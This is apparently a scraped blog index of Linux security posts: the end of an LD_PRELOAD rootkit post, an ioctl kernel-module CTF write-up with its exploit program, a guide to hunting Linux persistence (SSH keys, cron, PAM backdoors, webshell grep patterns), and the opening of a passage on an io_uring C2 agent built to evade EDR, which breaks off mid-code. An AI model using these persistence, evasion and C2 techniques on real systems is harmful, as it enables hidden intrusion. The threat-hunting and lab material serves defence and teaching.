to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, 